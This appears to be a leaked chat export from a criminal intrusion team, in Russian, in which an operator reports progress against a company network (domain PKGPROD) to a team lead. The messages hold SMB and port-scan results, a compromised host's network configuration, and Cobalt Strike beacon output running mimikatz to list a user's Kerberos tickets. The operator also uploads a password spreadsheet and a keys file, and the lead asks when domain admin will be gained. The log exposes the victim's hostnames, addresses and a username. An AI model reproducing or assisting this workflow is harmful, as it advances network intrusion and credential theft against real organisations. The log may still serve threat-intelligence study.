@@ -1,0 +1,229 @@
+{
+  "messages": [
+    {
+      "_id": "KB2rpWPCKBXJxskAi",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "```\n[*] 192.168.168.5:445     - SMB Detected (versions:) (preferred dialect:) (signatures:optional)\n[*] 192.168.168.5:445     -   Host could not be identified: Unix (Samba 3.0.33-3.41.el5_11)\n[*] 192.168.168.15:445    - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0) (signatures:optional) (uptime:21w 0d 1h 37m 25s) (guid:{ff73b7ae-f1ba-46e5-8e8b-3c9fb9444156}) (authentication domain:PKGPROD)\n[+] 192.168.168.15:445    -   Host is running Windows 2012 Standard (build:9200) (name:TIMECLOCKSQL) (domain:PKGPROD)\n[*] 192.168.168.10:445    - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0) (signatures:required) (uptime:6d 8h 40m 17s) (guid:{c40e3c81-0bce-4afc-ba0d-e18c58581a0c}) (authentication domain:PKGPROD)\n[+] 192.168.168.10:445    -   Host is running Windows 2012 Standard (build:9200) (name:2K12SERVER) (domain:PKGPROD)\n[*] 192.168.168.1-80:     - Scanned 23 of 80 hosts (28% complete)\n[*] 192.168.168.1-80:     - Scanned 31 of 80 hosts (38% complete)\n[*] 192.168.168.1-80:     - Scanned 45 of 80 hosts (56% complete)\n[*] 192.168.168.1-80:     - Scanned 46 of 80 hosts (57% complete)\n[*] 192.168.168.1-80:     - Scanned 50 of 80 hosts (62% complete)\n[*] 192.168.168.1-80:     - Scanned 50 of 80 hosts (62% complete)\n[*] 192.168.168.54:445    - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:optional) (uptime:1w 0d 8h 27m 49s) (guid:{56e90780-c2ba-45ef-877d-d2f418746196}) (authentication domain:PKGPROD)\n[+] 192.168.168.54:445    -   Host is running Windows 8.1 Pro (build:9600) (name:FRONTDESK) (domain:PKGPROD)\n[*] 192.168.168.53:445    - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{d0b01a41-07d7-4ad5-a0b6-90c069a5bd26}) (authentication domain:PKGPROD)\n[*] 192.168.168.70:445    - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:optional) (uptime:3d 8h 25m 12s) (guid:{cb8fffad-f637-4c85-b211-e32b405df3ac}) (authentication domain:PKGPROD)\n[+] 192.168.168.70:445    -   Host is running Windows 8.1 Pro (build:9600) (name:PKG-101) (domain:PKGPROD)\n[*] 192.168.168.63:445    - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:optional) (uptime:1w 0d 8h 28m 22s) (guid:{ac014121-b0c2-442a-93b8-d2c98f8c66e2}) (authentication domain:PKGPROD)\n[+] 192.168.168.63:445    -   Host is running Windows 8.1 Pro (build:9600) (name:PKG-102) (domain:PKGPROD)\n[*] 192.168.168.1-80:     - Scanned 56 of 80 hosts (70% complete)\n[*] 192.168.168.73:445    - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{ce91e8ea-649b-4aa0-b6e3-81718f694399}) (authentication domain:PKGPROD)\n[*] 192.168.168.66:445    - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{62b17fea-9ad5-4532-92cf-8276e5e90b86}) (authentication domain:PKGPROD)\n[*] 192.168.168.1-80:     - Scanned 71 of 80 hosts (88% complete)\n[*] 192.168.168.1-80:     - Scanned 80 of 80 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n```",
+      "ts": "2020-09-18T19:52:34.822Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T19:52:35.317Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3BCGi6F88hFicLPrm",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "https://kali.tools/?p=5342",
+      "ts": "2020-09-18T14:18:47.020Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T14:18:47.069Z",
+      "urls": [
+        {
+          "url": "https://kali.tools/?p=5342"
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2u64Z7DbS2qfhxiXk",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "что за тонкие клиенты?)",
+      "ts": "2020-09-18T13:47:05.629Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-18T13:47:05.669Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2C7wxd6jTJ3LsJdg3",
+      "rid": "h75FC55SC25paBdEi",
+      "ts": "2020-09-18T11:58:29.163Z",
+      "msg": "",
+      "file": {
+        "_id": "4s7ECiXcgBY8yMieg",
+        "name": "Passwords.xlsx",
+        "type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "Passwords.xlsx",
+          "title_link": "/file-upload/4s7ECiXcgBY8yMieg/Passwords.xlsx",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T11:58:29.199Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "je9oTrp2j9yXaytPP",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "скрипт запускает ` ACUCOBOL-GT Web Thin Client `",
+      "ts": "2020-09-18T11:27:33.258Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T11:27:33.285Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QDcGH2zYjN5mpybQd",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "```\n' Location of file with usernames and human-readable terminal numbers\nSouthWareUsersFile = \"swusers\\swusers.txt\"\n```",
+      "ts": "2020-09-18T11:24:38.237Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T11:24:38.310Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5AdJD3t34QN2Y2nnN",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "когда будет дА?",
+      "ts": "2020-09-18T10:31:47.020Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-18T10:31:47.053Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "62APtJYuCtbFcpune",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "так у вас как дела?",
+      "ts": "2020-09-18T10:21:18.403Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-18T10:21:18.454Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "44bJiGDCWrY7FYwCB",
+      "rid": "h75FC55SC25paBdEi",
+      "ts": "2020-09-18T09:59:25.788Z",
+      "msg": "",
+      "file": {
+        "_id": "LsgZC2iz2mfe95coE",
+        "name": "user7 - Fri Sep 18 2020 12:59:17 GMT+0300 (Moscow Standard Time).txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "user7 - Fri Sep 18 2020 12:59:17 GMT+0300 (Moscow Standard Time).txt",
+          "title_link": "/file-upload/LsgZC2iz2mfe95coE/user7%20-%20Fri%20Sep%2018%202020%2012:59:17%20GMT+0300%20(Moscow%20Standard%20Time).txt",
+          "title_link_download": true,
+          "type": "file",
+          "description": "ключи"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T09:59:25.831Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Xod9er6hdZTmcPiff",
+      "t": "au",
+      "rid": "h75FC55SC25paBdEi",
+      "ts": "2020-09-18T09:51:59.940Z",
+      "msg": "user2",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "groupable": false,
+      "_updatedAt": "2020-09-18T09:51:59.956Z"
+    },
+    {
+      "_id": "w37RB3qzyuZZgGGHJ",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "```\nbeacon> mimikatz kerberos::list\n[*] Tasked beacon to run mimikatz's kerberos::list command\n[+] host called home, sent: 706120 bytes\n[+] received output:\n\n[00000000] - 0x00000012 - aes256_hmac      \n   Start/End/MaxRenew: 9/17/2020 9:06:33 PM ; 9/18/2020 6:27:44 AM ; 9/24/2020 8:27:44 PM\n   Server Name       : krbtgt/PKGPROD.LOCAL @ PKGPROD.LOCAL\n   Client Name       : jess @ PKGPROD.LOCAL\n   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; \n\n[00000001] - 0x00000012 - aes256_hmac      \n   Start/End/MaxRenew: 9/17/2020 8:27:44 PM ; 9/18/2020 6:27:44 AM ; 9/24/2020 8:27:44 PM\n   Server Name       : krbtgt/PKGPROD.LOCAL @ PKGPROD.LOCAL\n   Client Name       : jess @ PKGPROD.LOCAL\n   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; \n\n[00000002] - 0x00000012 - aes256_hmac      \n   Start/End/MaxRenew: 9/18/2020 4:48:38 AM ; 9/18/2020 6:27:44 AM ; 9/24/2020 8:27:44 PM\n   Server Name       : RPCSS/2K12SERVER.pkgprod.local @ PKGPROD.LOCAL\n   Client Name       : jess @ PKGPROD.LOCAL\n   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; \n\n[00000003] - 0x00000012 - aes256_hmac      \n   Start/End/MaxRenew: 9/17/2020 9:06:33 PM ; 9/18/2020 6:27:44 AM ; 9/24/2020 8:27:44 PM\n   Server Name       : ldap/2k12server.pkgprod.local @ PKGPROD.LOCAL\n   Client Name       : jess @ PKGPROD.LOCAL\n   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; \n\n[00000004] - 0x00000012 - aes256_hmac      \n   Start/End/MaxRenew: 9/17/2020 9:06:33 PM ; 9/18/2020 6:27:44 AM ; 9/24/2020 8:27:44 PM\n   Server Name       : cifs/2k12server.pkgprod.local/pkgprod.local @ PKGPROD.LOCAL\n   Client Name       : jess @ PKGPROD.LOCAL\n   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; \n\n[00000005] - 0x00000012 - aes256_hmac      \n   Start/End/MaxRenew: 9/17/2020 9:06:32 PM ; 9/18/2020 6:27:44 AM ; 9/24/2020 8:27:44 PM\n   Server Name       : LDAP/2k12server.pkgprod.local/pkgprod.local @ PKGPROD.LOCAL\n   Client Name       : jess @ PKGPROD.LOCAL\n   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; \n```",
+      "ts": "2020-09-18T09:41:54.569Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T09:41:54.751Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zJXm4WyGxeHn66By2",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "```\n(ARP) Target '192.168.168.10' is alive. (ARP) Target '192.168.168.15' is alive. 00-15-5D-A8-0A-039C\n(ARP) Target '192.168.168.5' is alive. -(ARP) Target '192.168.168.1' is alive. 008E2C---1599B8---5D5BED---A88823---0A6A3A-\n-0100\n\n\n[+] received output:\n(ARP) Target '192.168.168.54' is alive. (ARP) Target '192.168.168.53' is alive. 64F4--5139--0609--551A--08EA--50A7\n\n(ARP) Target '192.168.168.63' is alive. A0-48-1C-99-8D-D8\n(ARP) Target '192.168.168.50' is alive. 98-8B-0A-C2-59-08\n(ARP) Target '192.168.168.66' is alive. (ARP) Target '192.168.168.70' is alive. F4A0--3948--091C--0F99--9B8E--A8AD\n\n(ARP) Target '192.168.168.73' is alive. 9C-7B-EF-AD-76-64\n\n[+] received output:\n(ARP) Target '192.168.168.88' is alive. 00-11-0A-F7-EA-A8\n\n[+] received output:\n(ARP) Target '192.168.168.231' is alive. 00-AF-1F-6F-A2-E1\n\n[+] received output:\n192.168.168.73:3389\n\n[+] received output:\n192.168.168.73:139\n192.168.168.73:135\n\n[+] received output:\n192.168.168.70:3389\n\n[+] received output:\n192.168.168.70:664\n\n[+] received output:\n192.168.168.70:623\n\n[+] received output:\n192.168.168.70:139\n192.168.168.70:135\n\n[+] received output:\n192.168.168.66:3389\n\n[+] received output:\n192.168.168.66:139\n192.168.168.66:135\n\n[+] received output:\n192.168.168.63:3389\n\n[+] received output:\n192.168.168.63:664\n\n[+] received output:\n192.168.168.63:623\n\n[+] received output:\n192.168.168.63:139\n192.168.168.63:135\n\n[+] received output:\n192.168.168.54:664\n\n[+] received output:\n192.168.168.54:139\n192.168.168.54:135\n\n[+] received output:\n192.168.168.53:3389\n\n[+] received output:\n192.168.168.53:139\n192.168.168.53:135\n\n[+] received output:\n192.168.168.50:554\n\n[+] received output:\n192.168.168.50:80\n\n[+] received output:\n192.168.168.15:5985\n192.168.168.15:5949\n192.168.168.15:5948\n\n[+] received output:\n192.168.168.15:5504\n\n[+] received output:\n192.168.168.15:3389\n\n[+] received output:\n192.168.168.15:443\n\n[+] received output:\n192.168.168.15:139\n192.168.168.15:135\n192.168.168.15:80\n192.168.168.10:5985\n192.168.168.10:5949\n192.168.168.10:5948\n\n[+] received output:\n192.168.168.10:3389\n\n[+] received output:\n192.168.168.10:636\n\n[+] received output:\n192.168.168.10:593\n\n[+] received output:\n192.168.168.10:464\n\n[+] received output:\n192.168.168.10:389\n192.168.168.10:139\n192.168.168.10:135\n\n[+] received output:\n192.168.168.10:88\n192.168.168.10:53\n192.168.168.5:5632\n\n[+] received output:\n192.168.168.5:631\n192.168.168.5:609\n\n[+] received output:\n192.168.168.5:139\n192.168.168.5:111\n192.168.168.5:22 (SSH-2.0-OpenSSH_4.3)\n\n[+] received output:\n192.168.168.1:443\n\n[+] received output:\n192.168.168.1:80\n192.168.168.1:22 (SSH-2.0-OpenSSH_7.2)\n192.168.168.5:445 (platform: 500 version: 4.9 name: PKGPROD domain: MYGROUP)\n192.168.168.10:445 (platform: 500 version: 6.2 name: 2K12SERVER domain: PKGPROD)\n192.168.168.15:445 (platform: 500 version: 6.2 name: TIMECLOCKSQL domain: PKGPROD)\n192.168.168.53:445 (platform: 500 version: 10.0 name: SALES2-HP-2019 domain: PKGPROD)\n192.168.168.54:445 (platform: 500 version: 6.3 name: FRONTDESK domain: PKGPROD)\n192.168.168.63:445 (platform: 500 version: 6.3 name: PKG-102 domain: PKGPROD)\n192.168.168.66:445 (platform: 500 version: 10.0 name: BARBARA-HP-2019 domain: PKGPROD)\n192.168.168.70:445 (platform: 500 version: 6.3 name: PKG-101 domain: PKGPROD)\n192.168.168.73:445 (platform: 500 version: 10.0 name: SALES1-HP-2019 domain: PKGPROD)\nScanner module is complete\n```",
+      "ts": "2020-09-18T09:39:59.229Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T09:39:59.758Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TRAa3Dwgob2geGSJv",
+      "rid": "h75FC55SC25paBdEi",
+      "msg": "```\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : Sales1-HP-2019\n   Primary Dns Suffix  . . . . . . . : pkgprod.local\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : pkgprod.local\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . : pkgprod.local\n   Description . . . . . . . . . . . : Realtek PCIe GbE Family Controller\n   Physical Address. . . . . . . . . : 9C-7B-EF-AD-76-64\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::994:371f:ea5d:17bb%7(Preferred) \n   IPv4 Address. . . . . . . . . . . : 192.168.168.73(Preferred) \n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Lease Obtained. . . . . . . . . . : Monday, September 14, 2020 6:18:32 PM\n   Lease Expires . . . . . . . . . . : Tuesday, September 22, 2020 6:18:28 PM\n   Default Gateway . . . . . . . . . : 192.168.168.1\n   DHCP Server . . . . . . . . . . . : 192.168.168.10\n   DHCPv6 IAID . . . . . . . . . . . : 110918639\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-C4-86-07-9C-7B-EF-AD-76-64\n   DNS Servers . . . . . . . . . . . : 192.168.168.10\n   Primary WINS Server . . . . . . . : 192.168.168.10\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n\n```",
+      "ts": "2020-09-18T08:37:03.683Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-18T08:38:37.416Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-09-18T08:38:37.411Z",
+      "editedBy": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7"
+      },
+      "urls": []
+    }
+  ],
+  "success": true
+}
